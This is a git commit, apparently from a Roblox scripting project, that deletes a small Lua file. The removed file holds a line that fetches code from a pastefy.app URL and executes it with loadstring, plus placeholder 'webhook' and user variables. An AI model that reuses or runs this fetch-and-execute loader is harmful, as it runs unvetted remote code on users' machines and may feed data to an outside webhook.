627324b49ecec4cd596281696c3c649abbb8abe7
Evelynn <folder.is.back@gmail.com>
2025-05-22 15:16:05 +0200

    Delete generated-scripts directory

--- generated-scripts/hi.lua
+++
@@ -1,7 +0,0 @@
-loadstring(game:HttpGet("https://pastefy.app/ACOX6D6h/raw"))()
-
-local webhook = "hi"
-local user1 = "hi"
-local user2 = "hi"
-
--- Additional generated Lua code can be appended here.
